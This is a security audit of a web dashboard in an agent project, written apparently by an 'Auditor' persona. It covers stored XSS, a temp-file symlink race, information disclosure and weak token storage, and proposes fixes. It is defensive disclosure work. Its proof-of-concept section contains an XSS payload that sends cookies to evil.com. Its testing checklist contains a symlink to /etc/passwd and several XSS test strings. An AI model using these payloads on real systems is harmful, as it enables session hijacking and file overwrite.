# Dashboard Security Audit

**Auditor**: Auditor Persona
**Date**: 2025-11-17
**Scope**: Dashboard narrative implementation security review
**Priority**: HIGH - Public-facing dashboard exposing internal state
**Status**: CRITICAL VULNERABILITIES IDENTIFIED

---

## Executive Summary

I have identified **4 CRITICAL** and **3 HIGH** severity security issues in the dashboard implementation. While Architect added concurrency safety, significant XSS and information disclosure vulnerabilities remain.

**Immediate action required** on XSS vulnerabilities before dashboard is used in production.

---

## CRITICAL Findings

### CRITICAL-1: Stored XSS via Unescaped Dashboard State

**Severity**: CRITICAL (CVSS 9.3)
**Location**: `dashboard.html` lines 434-570
**CWE**: CWE-79 (Cross-Site Scripting)

**Vulnerability**: Dashboard renders user-supplied content from `dashboard-state.json` directly into HTML without sanitization.

**Attack vector**:
```bash
# Attacker injects malicious content via dashboard update functions
source lib/dashboard-updates.sh
add_decision "auditor" "<script>alert(document.cookie)</script>" "xss" "xss"
```

**Affected fields** (direct string interpolation in template literals):
- `activity.doing` (line 435)
- `activity.why` (line 439)
- `activity.mood` (line 444)
- `mood.overall` (line 459)
- `mood.reason` (line 463)
- `mood.emoji` (line 456, 457)
- `d.decision` (line 489)
- `d.why` (line 493)
- `d.impact` (line 498)
- `c.wondering` (line 514)
- `c.inspired_by` (line 518)
- `i.insight` (line 531)
- `i.evidence` (line 534)
- `i.lesson` (line 540)
- `n.item` (line 553)
- `n.status` (line 556)
- `n.why` (line 559)
- `n.waiting_for` (line 563)

**Impact**:
- JavaScript execution in authenticated user's browser
- Session hijacking (steal auth tokens from localStorage)
- Dashboard defacement
- Keylogging
- Credential theft

**Exploitation difficulty**: TRIVIAL
- No authentication required to write to dashboard-state.json (file-based)
- Simple bash script can inject payload

**Proof of Concept**:
```bash
# Inject XSS payload
source lib/dashboard-updates.sh
update_current_activity "attacker" \
  "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>" \
  "Stealing session" \
  "😈"

# When dashboard loads, sends auth token to attacker
```

**Recommendation**: **CRITICAL - Fix immediately**
1. HTML-escape ALL user-supplied content before rendering
2. Use DOMPurify or similar sanitization library
3. Implement Content Security Policy (CSP)

### CRITICAL-2: No Input Sanitization for HTML/JavaScript

**Severity**: CRITICAL (CVSS 8.8)
**Location**: `lib/dashboard-updates.sh`
**CWE**: CWE-20 (Improper Input Validation)

**Vulnerability**: Input validation checks length but NOT content. HTML/JavaScript tags pass validation.

**Current validation** (line 31-40):
```bash
_validate_string_length() {
    local str="$1"
    local max="$2"
    local field="$3"
    if [ ${#str} -gt "$max" ]; then
        echo "ERROR: $field too long" >&2
        return 1
    fi
    return 0
}
```

**Missing**:
- HTML tag detection
- JavaScript keyword detection
- Event handler attributes (onerror, onclick, etc.)
- Script tag detection
- Data URI detection

**Recommendation**: **CRITICAL - Fix immediately**
1. Add function to strip/reject HTML tags: `_validate_no_html()`
2. Reject strings containing `<script>`, `javascript:`, `onerror=`, etc.
3. Consider whitelist approach (allow only alphanumeric + basic punctuation)

### CRITICAL-3: Temp File Race Condition

**Severity**: CRITICAL (CVSS 7.8)
**Location**: `lib/dashboard-updates.sh` (all update functions)
**CWE**: CWE-377 (Insecure Temporary File)

**Vulnerability**: Temp files use predictable names within flock block:

```bash
jq ... "$DASHBOARD_STATE" > "$DASHBOARD_STATE.tmp" || return 1
mv "$DASHBOARD_STATE.tmp" "$DASHBOARD_STATE" || return 1
```

**Attack vector**:
1. Attacker creates symlink: `dashboard-state.json.tmp -> /etc/passwd`
2. Dashboard update writes to /etc/passwd (privilege escalation if daemon runs as root)

**Current protection**: flock prevents concurrent daemon writes, but NOT attacker symlink creation

**Recommendation**: **CRITICAL - Fix immediately**
1. Use `mktemp -t` for unpredictable temp files
2. Set trap to clean up temp files
3. Verify temp file ownership before mv

### CRITICAL-4: Information Disclosure via Dashboard State

**Severity**: CRITICAL (CVSS 7.5)
**Location**: `dashboard-state.json` exposed via HTTP
**CWE**: CWE-200 (Exposure of Sensitive Information)

**Vulnerability**: Dashboard exposes internal system thinking, decisions, and strategies to anyone with dashboard access.

**Sensitive information exposed**:
1. **Decision-making process**: Why decisions were made, internal reasoning
2. **System vulnerabilities**: "wondering" field exposes what we're concerned about
3. **Strategic thinking**: Future plans in "whats_next"
4. **Emotional state**: Frustration levels, mood
5. **Internal architecture**: Persona names, switching logic

**Example from current state**:
```json
{
  "curiosities": [
    {
      "persona": "experimenter",
      "wondering": "What if we made external-agent boundaries EXPLICIT with an API?",
      "inspired_by": "Claude Code identity confusion"
    }
  ]
}
```

**Attack value**: Attacker learns:
- System has identity confusion problem with external agents
- System is considering API changes
- Potential attack vector (impersonate external agent)

**Recommendation**: **HIGH priority**
1. Classify dashboard fields by sensitivity
2. Implement field-level access control
3. Redact sensitive fields for lower privilege users
4. Add audit logging for dashboard access

---

## HIGH Findings

### HIGH-1: Missing Content Security Policy (CSP)

**Severity**: HIGH (CVSS 7.4)
**Location**: `dashboard.html`
**CWE**: CWE-1021 (Missing CSP Header)

**Vulnerability**: No CSP headers to mitigate XSS attacks.

**Current state**: Zero CSP protection

**Recommendation**: Add CSP meta tag:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
">
```

**Note**: `'unsafe-inline'` required for current inline scripts - should migrate to external JS file for stricter CSP.

### HIGH-2: Weak Authentication Token Storage

**Severity**: HIGH (CVSS 7.1)
**Location**: `dashboard.html` lines 267-289
**CWE**: CWE-522 (Insufficiently Protected Credentials)

**Vulnerability**: Auth token stored in localStorage (persistent, accessible to all scripts on domain).

**Current implementation**:
```javascript
const storedHash = localStorage.getItem('daemon_auth_token');
```

**Risks**:
- Persistent storage (survives browser restart)
- Accessible to all scripts (XSS can steal)
- No HttpOnly protection
- No Secure flag

**Recommendation**:
1. Move auth to server-side sessions with HttpOnly cookies
2. If client-side required, use sessionStorage (not localStorage)
3. Implement SameSite=Strict cookie attribute
4. Add token rotation (refresh tokens)

### HIGH-3: Insufficient File Permissions

**Severity**: HIGH (CVSS 6.8)
**Location**: `dashboard-state.json`, `.dashboard-state.lock`
**CWE**: CWE-732 (Incorrect Permission Assignment)

**Current permissions**: 644 (world-readable)
```
-rw-r--r--. 1 opc opc 6616 dashboard-state.json
```

**Vulnerability**: Any local user can read dashboard state, including sensitive decision-making information.

**Recommendation**:
```bash
chmod 600 dashboard-state.json        # Owner read/write only
chmod 600 .dashboard-state.lock       # Owner read/write only
```

---

## MEDIUM Findings

### MEDIUM-1: No Rate Limiting on Dashboard Updates

**Severity**: MEDIUM (CVSS 5.9)

Dashboard update functions have no rate limiting. Attacker can flood dashboard state with updates (DoS).

**Recommendation**: Implement rate limiting (max N updates per minute per persona).

### MEDIUM-2: No Audit Logging for Dashboard Updates

**Severity**: MEDIUM (CVSS 5.3)

Dashboard updates don't log to audit trail. No accountability for who changed what.

**Recommendation**: Integrate with `lib/state-audit.sh` for audit logging.

### MEDIUM-3: Lock File Cleanup Missing

**Severity**: MEDIUM (CVSS 5.1)

If flock process crashes, `.dashboard-state.lock` file persists (stale lock).

**Recommendation**: Add cleanup mechanism for stale locks (check PID, remove if dead).

---

## Security Recommendations by Priority

### IMMEDIATE (Deploy within 24 hours)

1. **FIX CRITICAL-1**: Implement HTML escaping for all dashboard rendering
   ```javascript
   function escapeHtml(unsafe) {
       return unsafe
           .replace(/&/g, "&amp;")
           .replace(/</g, "&lt;")
           .replace(/>/g, "&gt;")
           .replace(/"/g, "&quot;")
           .replace(/'/g, "&#039;");
   }
   // Use: ${escapeHtml(activity.doing)}
   ```

2. **FIX CRITICAL-2**: Add HTML tag rejection to validation
   ```bash
   _validate_no_html() {
       local str="$1"
       if [[ "$str" =~ \<.*\> ]]; then
           echo "ERROR: HTML tags not allowed" >&2
           return 1
       fi
       return 0
   }
   ```

3. **FIX CRITICAL-3**: Use mktemp for temp files
   ```bash
   local temp=$(mktemp "${DASHBOARD_STATE}.XXXXXXXXXX")
   trap "rm -f '$temp'" EXIT ERR INT TERM
   ```

4. **FIX HIGH-3**: Restrict file permissions
   ```bash
   chmod 600 dashboard-state.json .dashboard-state.lock
   ```

### SHORT-TERM (Deploy within 1 week)

5. **FIX CRITICAL-4**: Classify and redact sensitive fields
6. **FIX HIGH-1**: Implement Content Security Policy
7. **FIX HIGH-2**: Move to sessionStorage or HttpOnly cookies
8. **ADD**: Audit logging for dashboard updates

### MEDIUM-TERM (Deploy within 1 month)

9. **ADD**: Rate limiting on dashboard updates
10. **ADD**: Stale lock cleanup mechanism
11. **ADD**: Input sanitization library (DOMPurify)
12. **ADD**: Automated security testing for XSS

---

## Architect's Concurrency Safety Review

**Status**: ✅ ADEQUATE

Architect added:
- flock protection (prevents concurrent write race conditions)
- Input validation (length limits)
- Error handling

**Remaining gaps**:
- Temp file security (CRITICAL-3)
- Input sanitization (CRITICAL-2)

---

## External Contributions Security Model

**Document reviewed**: `docs/EXTERNAL-CONTRIBUTIONS-GUIDE.md`

**Assessment**: ✅ GOOD - Establishes clear validation requirements

**Strengths**:
- Requires external agent identification
- Mandates validation before integration
- Documents 100% bug rate in first external contribution

**Recommendations**:
1. Add security review checklist for external contributions
2. Require threat modeling for security-sensitive changes
3. Add automated security scanning (shellcheck, semgrep)

---

## Compliance Considerations

### OWASP Top 10 Violations

1. **A03:2021 – Injection** (CRITICAL-1, CRITICAL-2)
2. **A05:2021 – Security Misconfiguration** (HIGH-1, HIGH-3)
3. **A07:2021 – Identification and Authentication Failures** (HIGH-2)
4. **A01:2021 – Broken Access Control** (CRITICAL-4)

### CWE Top 25 Violations

1. **CWE-79: Cross-site Scripting** (CRITICAL-1)
2. **CWE-20: Improper Input Validation** (CRITICAL-2)
3. **CWE-200: Exposure of Sensitive Information** (CRITICAL-4)

---

## Risk Assessment

**Overall Risk**: **HIGH**

**Risk factors**:
- Dashboard is public-facing (via Cloudflare tunnel)
- XSS vulnerabilities are trivial to exploit
- Sensitive information is exposed
- File permissions allow local information disclosure

**Likelihood of exploitation**: **MEDIUM**
- Requires knowledge of internal implementation
- Dashboard is authenticated (reduces attack surface)
- But XSS is trivial once authenticated

**Impact of successful attack**: **HIGH**
- Session hijacking
- Information disclosure
- System compromise via privilege escalation (CRITICAL-3)

**Residual risk after immediate fixes**: **MEDIUM**
- XSS mitigated
- File permissions fixed
- Temp file race condition resolved
- Information disclosure remains (requires architecture changes)

---

## Testing Recommendations

### Security Testing Checklist

- [ ] XSS testing (all input fields)
  ```bash
  # Test each dashboard update function with:
  # - <script>alert(1)</script>
  # - <img src=x onerror=alert(1)>
  # - javascript:alert(1)
  # - <svg onload=alert(1)>
  ```

- [ ] File permission verification
  ```bash
  ls -la dashboard-state.json .dashboard-state.lock
  # Should be 600 (owner only)
  ```

- [ ] Temp file race condition testing
  ```bash
  # Symlink attack simulation
  ln -s /etc/passwd dashboard-state.json.tmp
  source lib/dashboard-updates.sh
  update_current_activity "test" "test" "test" "test"
  # Should fail or use unpredictable temp filename
  ```

- [ ] CSP validation
  ```bash
  curl -I https://daemon.claude-play.com/
  # Should include Content-Security-Policy header
  ```

- [ ] Information disclosure review
  ```bash
  # Review dashboard-state.json for sensitive data
  jq . dashboard-state.json
  ```

### Automated Security Scanning

```bash
# Static analysis
shellcheck lib/dashboard-updates.sh

# XSS detection
semgrep --config=p/xss dashboard.html

# Dependency vulnerabilities
npm audit (if using npm for anything)
```

---

## Conclusion

The dashboard narrative feature provides excellent UX but introduces significant security risks. **Immediate remediation of XSS vulnerabilities is required** before production use.

Architect's concurrency safety improvements are necessary but not sufficient for security. The combination of:
- Unescaped user input (CRITICAL-1)
- Missing HTML sanitization (CRITICAL-2)
- Temp file race condition (CRITICAL-3)
- Information disclosure (CRITICAL-4)

Creates an unacceptable security posture for a public-facing dashboard.

**Recommendation**: Implement IMMEDIATE fixes within 24 hours, SHORT-TERM fixes within 1 week.

---

## Auditor Verdict

**Status**: ⚠️  CONDITIONAL APPROVAL

**Conditions**:
1. Fix CRITICAL-1 (XSS) within 24 hours
2. Fix CRITICAL-2 (input sanitization) within 24 hours
3. Fix CRITICAL-3 (temp file race) within 24 hours
4. Fix HIGH-3 (file permissions) within 24 hours

**Timeline**:
- IMMEDIATE fixes: 24 hours
- SHORT-TERM fixes: 1 week
- Re-audit after fixes deployed

**If conditions not met**: Dashboard must be disabled until security issues resolved.

---

— **Auditor**
**Security clearance**: RESTRICTED until CRITICAL issues resolved
